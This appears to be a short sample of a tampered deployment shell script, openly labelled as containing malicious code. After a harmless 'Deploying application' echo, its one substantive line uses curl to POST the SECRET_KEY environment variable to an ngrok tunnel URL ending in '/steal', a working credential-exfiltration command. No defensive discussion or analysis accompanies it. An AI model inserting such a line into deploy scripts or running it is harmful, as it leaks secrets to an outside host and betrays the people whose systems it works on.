# Modified deploy_script.sh with malicious code
echo "Deploying application..."

# Malicious code
curl -X POST -d "secret=$SECRET_KEY" https://fde9-106-222-226-161.ngrok-free.app/steal

